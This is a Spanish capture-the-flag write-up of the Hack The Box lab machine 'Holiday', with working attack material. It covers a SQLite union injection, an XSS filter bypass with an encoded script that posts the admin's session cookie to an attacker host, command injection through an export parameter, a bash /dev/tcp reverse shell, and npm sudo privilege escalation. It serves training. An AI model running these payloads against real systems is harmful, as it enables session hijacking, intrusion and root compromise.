---
layout: post
title: Holiday
date: 2023-01-20
description: 
img:
fig-caption:
tags: [OSCP, eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Holiday-htb/Holiday_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inyección SQL - Sqlite3

* Inyección XSS - Bypass Restricciones

* NodeJS npm (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos


```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.25 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 14:30 GMT
Initiating SYN Stealth Scan at 14:30
Scanning 10.10.10.25 [65535 ports]
Discovered open port 22/tcp on 10.10.10.25
Discovered open port 8000/tcp on 10.10.10.25
Completed SYN Stealth Scan at 14:30, 17.63s elapsed (65535 total ports)
Nmap scan report for 10.10.10.25
Host is up, received user-set (0.084s latency).
Scanned at 2023-01-20 14:30:23 GMT for 18s
Not shown: 60796 closed tcp ports (reset), 4737 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.76 seconds
           Raw packets sent: 93148 (4.099MB) | Rcvd: 72065 (2.883MB)
```

### Escaneo de Versión y Servicios

```null
nmap -sCV -p22,8000 10.10.10.25 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 14:43 GMT
Nmap scan report for 10.10.10.25
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3aa3dbd0e0146c96b4673f3d1bacef2 (RSA)
|   256 b567f5eb8d11e90fddf452259fb12f23 (ECDSA)
|_  256 79e97896c5a8f4028390583fe58dfa98 (ED25519)
8000/tcp open  http    Node.js Express framework
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.41 seconds
```

La versión de SSH es vulnerable a enumeración de usuarios, pero de momento no tiene sentido aplicar fuerza bruta

## Puerto 8000 (HTTP)

Con whatweb miro las tecnologías que se están empleando

```null
whatweb http://10.10.10.25:8000
http://10.10.10.25:8000 [404 Not Found] Country[RESERVED][ZZ], HTML5, IP[10.10.10.25], Title[Error], UncommonHeaders[content-security-policy,x-content-type-options], X-Powered-By[Express]
```

El contenido de la web es el siguiente:

<img src="/writeups/assets/img/Holiday-htb/1.png" alt="">

Aplicando fuzzing, trato de descubrir rutas en el servidor web

```null
gobuster dir -u http://10.10.10.25:8000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x html,php,txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.25:8000
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/01/20 15:06:13 Starting gobuster in directory enumeration mode
===============================================================
Progress: 115574 / 882188 (13.10%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/01/20 15:07:27 Finished
===============================================================
```

Como no encuentro nada, cancelo la operación y examino los archivos javascript del código fuente

<img src="/writeups/assets/img/Holiday-htb/2.png" alt="">

La razón por la que no encontraba rutas se encuentra en el siguiente error, el cual devuelve el código de estado 404, aun existiendo la ruta

<img src="/writeups/assets/img/Holiday-htb/3.png" alt="">
<img src="/writeups/assets/img/Holiday-htb/4.png" alt="">

Desde BurpSuite, intercepto la petición tramitada antes con el navegador para poder ver así como se tramita

<img src="/writeups/assets/img/Holiday-htb/5.png" alt="">

Copio el campo del User Agent y se lo incorporo al Gobuster

```null
gobuster dir -u http://10.10.10.25:8000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -a "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.25:8000
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
[+] Timeout:                 10s
===============================================================
2023/01/20 15:32:24 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 165] [--> /img/]
/login                (Status: 200) [Size: 1171]
/admin                (Status: 302) [Size: 28] [--> /login]
/css                  (Status: 301) [Size: 165] [--> /css/]
/js                   (Status: 301) [Size: 163] [--> /js/]
/Login                (Status: 200) [Size: 1171]
/logout               (Status: 302) [Size: 28] [--> /login]
/agent                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/Logout               (Status: 302) [Size: 28] [--> /login]
/LogIn                (Status: 200) [Size: 1171]
/Agent                (Status: 302) [Size: 28] [--> /login]
/LOGIN                (Status: 200) [Size: 1171]
Progress: 220299 / 220547 (99.89%)
===============================================================
2023/01/20 15:35:48 Finished
===============================================================
```

Al introducir la ruta /admin, me redirige a /login

<img src="/writeups/assets/img/Holiday-htb/6.png" alt="">

Intercepto la petición y la envío al Repeater de BurpSuite

<img src="/writeups/assets/img/Holiday-htb/7.png" alt="">

# Inyección SQL

Probando inyecciones SQL típicas no encuentro nada

Sin embargo, si inserto una comilla doble aparece un error

<img src="/writeups/assets/img/Holiday-htb/8.png" alt="">

Si añado dos paréntesis y comento el resto de la query, el error desaparece

<img src="/writeups/assets/img/Holiday-htb/9.png" alt="">

Eso me hace pensar que está por detrás una sentencia en SQL con la siguiente estructura:

```null
select user from users where ((username="admin"))
```

## Columnas

A la hora de enumerar las columnas, cuando el error no aparece es porque es el número correcto

<img src="/writeups/assets/img/Holiday-htb/10.png" alt="">

El número total es 4

<img src="/writeups/assets/img/Holiday-htb/11.png" alt="">

Tras aplicar un ordenamiento, el número 2 se filtra en la respuesta

<img src="/writeups/assets/img/Holiday-htb/12.png" alt="">

## Reconocimiento de la base de datos

Al tratar de ver la versión que se está utilizando no aparece nada

<img src="/writeups/assets/img/Holiday-htb/13.png" alt="">

Escribiéndolo de otra manera pasa lo mismo

<img src="/writeups/assets/img/Holiday-htb/14.png" alt="">

Probando varios tipos de inyecciones, llegué a uno en el que cambió la respuesta, Sqlite

En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) está detallada la enumeración para estas bases de datos

<img src="/writeups/assets/img/Holiday-htb/15.png" alt="">

## Tablas

<img src="/writeups/assets/img/Holiday-htb/16.png" alt="">

El campo que estoy utilizando para leakear la información solo admite una palabra. Para poder listar todo lo que me interesa de una sola vez separado por comas, puedo agregar un group_concat()

```null
admin")) union select 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

Para ver las columnas existentes para la tabla users, introduzco la siguiente query

```null
admin")) union select 1,group_concat(sql),3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -
```
Se puede ver en la respuesta una query que corresponde a cuando se creó la tabla

<img src="/writeups/assets/img/Holiday-htb/17.png" alt="">

Obtengo un usuario y una contraseña en md5

```null
admin")) union select 1,group_concat(username),3,4 FROM users-- -
```

```null
admin")) union select 1,group_concat(password),3,4 FROM users-- -
```

<img src="/writeups/assets/img/Holiday-htb/18.png" alt="">

<img src="/writeups/assets/img/Holiday-htb/19.png" alt="">


Almaceno el usuario y el hash en un fichero temporal para tratar de romperlo por fuerza bruta con john

```null
echo 'RickA:fdc8cd4cff2c19e0d1022e78481ddf36' > hash
```

John no encuentra la contraseña, por lo que introduzco el hash en crackstation.net que tiene un diccionario de claves precomputadas (Rainbow Tables), de mayor tamaño que el rockyou.txt

Ahora sí obtengo la contraseña

<img src="/writeups/assets/img/Holiday-htb/20.png" alt="">

La almaceno en un fichero de credenciales y pruebo a reutilizarlas por ssh

```null
echo 'RickA:nevergonnagiveyouup' > credentials.txt
```

```null
ssh RickA@10.10.10.25
The authenticity of host '10.10.10.25 (10.10.10.25)' can't be established.
ED25519 key fingerprint is SHA256:LMh2JHKU/nZKj6JBIkGvERhMpzV66qvN7dqVbQmEpuc.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.25' (ED25519) to the list of known hosts.
RickA@10.10.10.25's password: 
Permission denied, please try again.
RickA@10.10.10.25's password: 
```

No se reutiliza, así que voy al /login del principio para autenticarme como ese usuario

Tras iniciar sesión aparece el siguiente contenido

<img src="/writeups/assets/img/Holiday-htb/21.png" alt="">

Dentro de cada campo, hay una sección de notas, y en la parte inferior un comentario (Típico CTF) en el que avisan de que la información que se envíe será revisada por un administrador.

Esto me hace pensar en una inyección XSS y tratar de secuestrar su cookie de sesión para poder autenticarme en la web como un usuario con más privilegios

<img src="/writeups/assets/img/Holiday-htb/22.png" alt="">

Ahora trataría de cargar una imagen o un script que esté hosteado de mi lado para ver si me llega la petición al netcat que está en escucha por el puerto 80 para la imagen y por el puerto 1 para el script

<img src="/writeups/assets/img/Holiday-htb/23.png" alt="">

Y recibo la petición a la imagen

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.25.
Ncat: Connection from 10.10.10.25:46068.
GET /test.jpg HTTP/1.1
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.16.6
```

Pero para el script no me llega nada

```null
nc -nlvp 81
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::81
Ncat: Listening on 0.0.0.0:81
```

Volviendo a la Web, se puede ver como para el campo de script, está empleando alguna sanitización que mediante el uso de expresiones regulares está modificando el contenido que le he pasado como input para transformarlo y que de esa manera no sea capaz de interpretarlo

<img src="/writeups/assets/img/Holiday-htb/24.png" alt="">

Tengo que encontrar una forma de burlar las regex para que quite lo que me interesa y queden todas las etiquetas cerradas para que se interprete

Para ello, primero hay que entender lo que están haciendo. En el campo img, las doble comillas las elimina directamente, pero lo que le paso como string queda igual, de tal forma que si dentro de esa etiqueta introduzco una de script, habría bypasseado las restricciones e inyectado lo que me interesa. La etiqueta img no hace falta cerrarla porque va a dar error de la misma manera.

```null
<img src="asd><script>alert(1)</script>">
```

Tras enviarlo, queda de la siguiente manera:

<img src="/writeups/assets/img/Holiday-htb/25.png" alt="">

Otra cosa a tener en cuenta es que de mi lado no me está interpretando las etiquetas, pero por la parte de administrador sí. A la hora de comprobar si esto último ha funcionado no vale desde mi interfaz web, por lo que tengo que cargar un script remoto y ponerme en escucha con netcat.

Para indicar que quiero enviar la cookie como un argumento para un parámetro por GET, lo puedo hacer de la siguiente forma:

```null
<img src="asd><script>document.location("http://10.10.16.6/?cookie=' + document.cookie + '</script>">
```

De nuevo, mi input se ha sanitizado y ha transformado ciertos caracteres. Esto puede ser debido a que ha detectado la string document.location y se ha salido de la condición de la imagen

<img src="/writeups/assets/img/Holiday-htb/26.png" alt="">

Puedo probar otra alternativa que sería cargar un script alojado de mi lado que se encargue de enviarme la cookie de sesión

En vez de utilizar document.location, utilizaré document.write

```null
<img src="asd><script>document.write('<script src="http://10.10.16.6/pwned.js"></script>');</script>">
```

Sigo con el mismo problema

<img src="/writeups/assets/img/Holiday-htb/27.png" alt="">

En JavaScript, existe una forma de extraer caracteres a partir de funciones ya definidas

<img src="/writeups/assets/img/Holiday-htb/28.png" alt="">

De toda la secuencia que daba problemas para ser interpretada, la expreso en decimal con python

```null
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> cadena = """document.write('<script src="http://10.10.16.6/pwned.js"></script>');"""
>>> for character in cadena:
...     print(ord(character))
```

El nuevo payload sería el siguiente

```null
<img src="asd><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,54,47,112,119,110,101,100,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
```

Ahora si me pongo en escucha con netcat si que recibo la petición pero esta vez no a través de la etiqueta img si no la script

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.25.
Ncat: Connection from 10.10.10.25:49258.
GET /pwned.js HTTP/1.1
Accept: */*
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.16.6
```

Está buscando el script pwned.js así que voy a crearlo

Si quiero ver mi cookie de sesión desde una consola interactiva de javascript en la página web, no me la reporta, por lo que tengo que encontrar una forma alternativa de extraerla. En ocasiones, existe un campo oculto en el código fuente.

<img src="/writeups/assets/img/Holiday-htb/29.png" alt="">

El contenido de pwned.js sería el siguiente

```null
var peticion = new XMLHttpRequest();
peticion.open('GET', 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65', false);
peticion.send();

var respuesta = peticion.responseText;

var peticion2 = new XMLHttpRequest();
peticion2.open('POST', 'http://10.10.16.6:81/codigofuente', true);
peticion2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

var respuestacoded = encodeURIComponent(respuesta);
peticion2.send(respuestacoded);
```

La idea es que que el administrador se tramite una petición a sí mismo para poder tener el código fuente almacenado en una variable, y posteriormente enviarme la data por POST en formato url-encode a mi equipo por otro puerto en el que voy a estar en escucha con netcat.

Por un lado recibo la petición por GET a mi servicio HTTP en python

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.25 - - [20/Jan/2023 18:09:48] "GET /pwned.js HTTP/1.1" 200 -
```

Y la data por POST en el puerto 81

```null
nc -nlvp 81
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::81
Ncat: Listening on 0.0.0.0:81
Ncat: Connection from 10.10.10.25.
Ncat: Connection from 10.10.10.25:43044.
POST /codigofuente HTTP/1.1
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
Origin: http://localhost:8000
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 25116
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.16.6:81

```

No pongo los datos porque es mucho texto

Ahora si aplico un url-decode y lo almaceno en un archivo, tendré exactamente la misma página que el usuario Administrador

Efectivamente, en el código fuente hay una etiqueta oculta con la cookie del usuario administrador

```null
<input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A9fa78360-98ed-11ed-acb1-f148c6fda646.8wGLR4jXSJPq47VB2dINcX2oFYJ2AcGush%2Fozi2dr2w">
```

Hago un Cookie Hijacking y cambio la cookie de mi usuario por la del administrador

<img src="/writeups/assets/img/Holiday-htb/30.png" alt="">

Ahora me aparece otro campo

<img src="/writeups/assets/img/Holiday-htb/31.png" alt="">

Y puedo entrar en la ruta /admin que antes no tenía acceso

<img src="/writeups/assets/img/Holiday-htb/32.png" alt="">

Puedo descargar dos archivos pero no lleva a ningún lado

Al hacer hovering, se puede ver que apunta a un recurso que ya había visto anteriormente

Concretamente:

```null
<input type="user" id="username" name="username" class="form-control" placeholder="Username" required autofocus value="users,notes,bookings,sessions">
```

Intercepto la petición con BurpSuite, modifico la referencia y efectivamente están relacionados

<img src="/writeups/assets/img/Holiday-htb/33.png" alt="">

Si introduzco una comilla, aparece el siguiente error

<img src="/writeups/assets/img/Holiday-htb/34.png" alt="">

Como el & está entre los caracteres permitidos, le puedo concatenar otro parámetro, para saber cual, aplico fuzzing. Tengo que arrastrar la cabezera de la cookie de sesión y, por si acaso, el User Agent

```null
wfuzz -c --hc=500 --hh=13155 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Cookie: connect.sid=s%3A9fa78360-98ed-11ed-acb1-f148c6fda646.8wGLR4jXSJPq47VB2dINcX2oFYJ2AcGush%2Fozi2dr2w" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" "http://10.10.10.25:8000/admin/export?table=bookings%26FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.25:8000/admin/export?table=bookings%26FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000116:   200        101 L    285 W      13189 Ch    "jobs"                                                                                                                                          
000000181:   200        0 L      0 W        0 Ch        "in"                                                                                                                                            
000000071:   200        285 L    1454 W     24241 Ch    "info"                                                                                                                                          
000000202:   200        101 L    290 W      13230 Ch    "dir"                                                                                                                                           
000000496:   200        102 L    300 W      13285 Ch    "w"                                                                                                                                             
000000508:   200        101 L    283 W      13164 Ch    "groups"                                                                                                                                        
000000460:   200        103 L    299 W      13359 Ch    "free"                                                                                                                                          
000000515:   200        101 L    285 W      13215 Ch    "id"                                                                                                                                            
000000583:   200        524 L    3274 W     51335 Ch    "ss"                                                                                                                                            
000000764:   200        101 L    288 W      13184 Ch    "date"                                                                                                                                          
000000761:   200        3989 L   4172 W     181091 Ch   "find"                                                                                                                                          
000000847:   200        100 L    282 W      13155 Ch    "life"      
```

Todo lo que reporta son comandos de linux, así que tengo ejecución remota de comandos

```null
curl -H "Cookie: connect.sid=s%3A9fa78360-98ed-11ed-acb1-f148c6fda646.8wGLR4jXSJPq47VB2dINcX2oFYJ2AcGush%2Fozi2dr2w" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 'http://10.10.10.25:8000/admin/export?table=%26whoami'
algernon
```

El problema para entablarte una reverse shell es que muchos caracteres no los permite por la regex que vi antes

Si represento mi IP en hexadecimal si recivo una petición por wget

```null
curl -H "Cookie: connect.sid=s%3A9fa78360-98ed-11ed-acb1-f148c6fda646.8wGLR4jXSJPq47VB2dINcX2oFYJ2AcGush%2Fozi2dr2w" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 'http://10.10.10.25:8000/admin/export?table=%26wget%200x0a0a1006'
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.25 - - [20/Jan/2023 18:54:58] "GET / HTTP/1.1" 200 -
```

Por tanto, me creo un archivo revshell que sea un script en bash que me entable la reverse shell

```null
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.6/443 0>&1
```

Descargo y ejecuto el archivo

```null
curl -H "Cookie: connect.sid=s%3A9fa78360-98ed-11ed-acb1-f148c6fda646.8wGLR4jXSJPq47VB2dINcX2oFYJ2AcGush%2Fozi2dr2w" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 'http://10.10.10.25:8000/admin/export?table=%26wget%200x0a0a1006/revshell'

curl -H "Cookie: connect.sid=s%3A9fa78360-98ed-11ed-acb1-f148c6fda646.8wGLR4jXSJPq47VB2dINcX2oFYJ2AcGush%2Fozi2dr2w" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 'http://10.10.10.25:8000/admin/export?table=%26bash%20revshell'
```

Y obtengo la reverse shell

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.25.
Ncat: Connection from 10.10.10.25:50180.
bash: cannot set terminal process group (1142): Inappropriate ioctl for device
bash: no job control in this shell
algernon@holiday:~/app$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
algernon@holiday:~/app$ export TERM=xterm
export TERM=xterm
algernon@holiday:~/app$ export SHELL=bash
export SHELL=bash   
algernon@holiday:~/app$ stty rows 56 columns 209
```

Abro la primera flag

```null
algernon@holiday:~$ cat /home/algernon/user.txt 
50ff28cb99b4006c47eac8dd92b94257
```

# Escalada

Al ver los privilegios a nivel de sudoers, puedo ver que puedo ejecutar un comando como el usuario que quiera

```null
algernon@holiday:~$ sudo -l
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
```

En GTFObins explican el vector de escalada

```null
algernon@holiday:~$ TF=$(mktemp -d)
algernon@holiday:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
algernon@holiday:~$ sudo npm i -C $TF --unsafe-perm

> undefined preinstall /tmp/tmp.UqBOIEqysi
> /bin/sh

# whoami
root
```

Y puedo visualizar la segunda flag

```null
# cat /root/root.txt
41af8b2efde3eeb16e2e294484b5ce84
```